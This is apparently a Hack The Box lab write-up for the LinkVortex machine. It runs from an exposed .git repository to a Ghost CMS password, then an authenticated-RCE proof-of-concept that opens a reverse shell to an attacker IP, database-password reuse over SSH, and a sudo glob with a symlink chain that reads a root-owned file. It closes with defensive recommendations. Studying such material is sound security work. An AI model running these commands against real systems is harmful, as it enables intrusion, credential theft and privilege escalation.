---
title: "LinkVortex — Exposed Git History to Ghost CMS RCE and a Symlink-Protection Bypass"
seoTitle: "LinkVortex — Exposed Git History to Ghost CMS RCE and Symlink Bypass"
description: "An exposed .git directory on a development virtual host reveals a CMS password for authenticated RCE; a sudo cleanup script with a user-controlled glob and a two-hop symlink chain reads a protected file."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - git
  - ghost-cms
  - symlink
  - sudo
objective: "Escalate from an exposed Git repository on a development virtual host to root-owned file read via Ghost CMS code execution and a privileged cleanup script."
tools:
  - rustscan
  - nmap
  - gobuster
  - feroxbuster
  - git
  - git-dumper
  - sshpass
  - netcat
skill: "Web enumeration and Linux privilege escalation"
outcome: "Authenticated Ghost CMS remote code execution as the application user, followed by a root-owned file read through a sudo glob and a two-hop symlink chain"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Ubuntu 22.04 Linux host running Apache and Ghost CMS 5.58.0 |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an exposed Git repository on a development virtual host to root-owned file read |
| Outcome | Ghost CMS authenticated RCE as the application user; root-owned file read via a sudo glob and symlink chain |

## From exposed Git history to CMS RCE

LinkVortex is an Easy-rated Hack The Box Linux lab. Virtual-host enumeration exposes a development subdomain whose web root publishes a `.git` directory; the repository's staged changes reveal a Ghost CMS password that authenticates to the admin panel. That access enables an authenticated remote code execution flaw in Ghost (CVE-2026-29053) and yields a shell as the application user, whose database password is reused for SSH. Privilege escalation abuses a sudo rule that passes a user-controlled `*.png` glob to a cleanup script, and a two-hop symlink chain reads a root-owned file despite `fs.protected_symlinks=1`. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Exposed `.git` → Git-diff credential disclosure → Ghost CMS admin authentication → CVE-2026-29053 authenticated RCE → database-credential reuse → SSH access → sudo glob + two-hop symlink chain → root-owned file read**

## Apache and Ghost CMS host from unauthenticated access

- **Target:** a single Ubuntu 22.04 Linux host running Apache with name-based virtual hosting and a Ghost CMS 5.58.0 instance.
- **Exposed services:** SSH (22) and HTTP (80).
- **Starting position:** unauthenticated network access; the initial HTTP response points to the base virtual host.
- **Objective:** recover credentials from an exposed repository, obtain access through Ghost, move to the system account, and read a root-owned file through a privileged cleanup script.
- **Constraints:** activity was confined to the Hack The Box lab environment.

## Evidence: exposed Git to sudo symlink read

### 1. Service Enumeration

Observation: an initial port scan exposes two services.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/target-tcp
```

```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd
```

Significance: SSH needs credentials that are not yet available, so HTTP becomes the primary enumeration surface; the web service redirects, which indicates name-based virtual hosting.

Result: SSH and HTTP are reachable on the target.

### 2. Virtual Host Enumeration

Observation: the web server redirects to `<TARGET_HOSTNAME>`, so additional hostnames may be served by the same listener.

```bash
gobuster vhost \
  --url http://<TARGET_HOSTNAME> \
  --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  --append-domain
```

```text
<DEVELOPMENT_HOSTNAME>  Status: 200
```

Significance: a development virtual host is served alongside the main site and widens the surface to an environment that typically holds unreleased code and deployment artifacts.

Result: `<DEVELOPMENT_HOSTNAME>` is identified as a valid virtual host.

### 3. Exposed Git Repository

Observation: content discovery against the development host is likely to surface deployed source-control metadata.

```bash
feroxbuster --url http://<DEVELOPMENT_HOSTNAME> --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
```

```text
http://<DEVELOPMENT_HOSTNAME>/.git
```

Action: retrieve and inspect the repository.

```bash
git-dumper http://<DEVELOPMENT_HOSTNAME>/.git git-dump
cd git-dump
git status
```

```text
Changes to be committed:
  new file:   Dockerfile.ghost
  modified:   ghost/core/test/regression/api/admin/authentication.test.js
```

Restore the staged changes and diff them:

```bash
git restore --staged .
git diff
```

```diff
-it('complete setup', async function () {
-    const email = 'test@example.com';
-    const password = '<OLD_TEST_PASSWORD>';
+    const password = '<GHOST_ADMIN_PASSWORD>';
```

Significance: the staged index retained a password change that the deployed files no longer showed, so the published `.git` directory disclosed the current credential without exploitation.

Result: `git-dumper` recovered the repository, and the diff disclosed the CMS password.

### 4. Ghost CMS Authenticated RCE (CVE-2026-29053)

Observation: the main site runs Ghost CMS 5.58.0, and the recovered password authenticates to the admin panel. Ghost 0.7.2 through 6.19.0 is affected by CVE-2026-29053, an authenticated remote code execution flaw in theme handling fixed in 6.19.1.

Action: run the proof-of-concept against the admin instance and catch the callback.

```bash
python3 exploit.py -i <ATTACKER_IP> -p <LISTENER_PORT>
```

```bash
nc -lvnp <LISTENER_PORT>
```

The proof-of-concept uploads a crafted theme through the admin panel and triggers execution through a crafted page request.

Significance: authenticated administrator access is sufficient to reach server-side code execution, with no further system misconfiguration required.

Result: a reverse shell executes as the Ghost application user.

### 5. Reverse Shell and Credential Harvesting

Observation: the shell runs as the Ghost application user, whose configuration file stores database credentials.

```json
{
  "user": "<SERVICE_USER>",
  "pass": "<DB_PASSWORD>"
}
```

The same password also authenticated over SSH as `<SERVICE_USER>`; the source confirms the application and system passwords are one value.

```bash
sshpass -p '<DB_PASSWORD>' ssh <SERVICE_USER>@<TARGET_IP>
```

Significance: reusing one secret across the application configuration and the operating-system account turns a CMS compromise into a system login.

Result: a user-level SSH session is obtained with the recovered credentials.

### 6. Privilege Escalation: Sudo Glob and Symlink Bypass

Observation: I checked the account's sudo rule, which runs a cleanup script with a caller-supplied glob.

```bash
sudo -l
```

```text
User <SERVICE_USER> may run the following commands on <TARGET_HOSTNAME>:
    (ALL) NOPASSWD: /usr/bin/bash <CLEANUP_SCRIPT> *.png
```

The `*.png` glob expands in the shell before the script runs, so the caller controls which paths the privileged script receives. The host also enforces kernel symlink protection:

```bash
sysctl fs.protected_symlinks
```

```text
fs.protected_symlinks = 1
```

Significance: the host enables `fs.protected_symlinks=1`, yet the read still succeeds. The sudo rule runs a privileged cleanup script and accepts a user-controlled `*.png` glob, so the caller controls the path the script is pointed at. A two-hop chain is passed to the script: an intermediate symlink to the protected file, then a `.png`-named symlink to that intermediate link. The script returns the protected file's contents.

```bash
ln -s <PROTECTED_FILE_PATH> <USER_CACHE>/b
ln -s <USER_CACHE>/b <USER_CACHE>/a.png
ls -l <USER_CACHE>/a.png
```

```text
lrwxrwxrwx 1 <USER> <GROUP> <LENGTH> <USER_CACHE>/a.png -> <USER_CACHE>/b
```

Run the privileged script through the primed path:

```bash
CHECK_CONTENT=true sudo bash <CLEANUP_SCRIPT> <USER_CACHE>/a.png
```

Result: the script returns the contents of the root-owned file through its own resolution of the symlink chain.

## The staged credential and the symlink protection

| Challenge | Decision | Rationale |
|---|---|---|
| The password change sat in the staged Git index rather than a configuration file | Unstaged and diffed the repository | Staged changes retained a credential the deployed files no longer showed |
| `fs.protected_symlinks=1` is enabled on the host | Created a two-hop symlink chain | The rule passes a caller-controlled `*.png` path to a privileged cleanup script, which returns the protected file's contents despite the symlink-protection setting |

## Outcome: Ghost RCE and root-owned file read

Authenticated Ghost CMS code execution yielded a shell as the application user; the reused configuration password provided a system-level SSH session, and a sudo rule accepting a user-controlled glob plus a two-hop symlink chain granted a read of a root-owned file. The admin login, reverse shell, and SSH session are recorded in the source as documented results without captured console output, so I could not verify them directly.

## Recommendations: exposed Git, credential reuse, unpatched CMS, and sudo globs

The actions below are preventative recommendations. No validation is documented.

1. **Exposed `.git` on a deployed web root.** The development virtual host served `.git`, exposing repository history and staged changes that held a live password change. *Impact:* an unauthenticated party recovered the CMS administrator credential. *Recommendation:* deploy web roots without any version-control metadata and keep development hosts off public DNS. *Detection:* alert when requests target `/.git/`; rotate secrets that ever passed through a published repository.
2. **Credential reuse across application and system accounts.** The Ghost database password also authenticated the corresponding operating-system account. *Impact:* CMS code execution became a direct system login. *Recommendation:* issue unique credentials per service and account and never reuse an application secret as a system password. *Detection:* monitor interactive SSH logins that use application service accounts.
3. **Authenticated RCE in an unpatched CMS.** Ghost CMS 5.58.0 falls inside the affected range for CVE-2026-29053. *Impact:* an authenticated administrator could execute code on the host. *Recommendation:* track Ghost releases and apply the 6.19.1 fix or later, restrict who holds admin access, and monitor theme uploads.
4. **Privileged scripts with user-controlled globs.** The sudo rule passed a caller-supplied `*.png` glob into a root-run script that resolved a two-hop symlink chain to a root-owned file. *Impact:* a root-owned file was read. *Recommendation:* never pass user-controlled globs or paths into privileged scripts, bind fixed paths, and validate all inputs; keep `fs.protected_symlinks=1` as defense in depth while treating it as incomplete protection.

## References

- [Hack The Box — LinkVortex](https://app.hackthebox.com/machines/LinkVortex) (retired machine)
- [NVD — CVE-2026-29053](https://nvd.nist.gov/vuln/detail/CVE-2026-29053) (Ghost theme-handling remote code execution)
- [GitHub Advisory — GHSA-cgc2-rcrh-qr5x](https://github.com/TryGhost/Ghost/security/advisories/GHSA-cgc2-rcrh-qr5x) (Ghost vendor advisory, fixed in 6.19.1)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Gobuster](https://github.com/OJ/gobuster) (virtual-host and content discovery)
- [feroxbuster](https://github.com/epi052/feroxbuster) (recursive content discovery)
- [git-dumper](https://github.com/arthaud/git-dumper) (exposed-repository recovery)
- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
- [Linux kernel — `fs` sysctl documentation](https://docs.kernel.org/admin-guide/sysctl/fs.html) (`fs.protected_symlinks`)
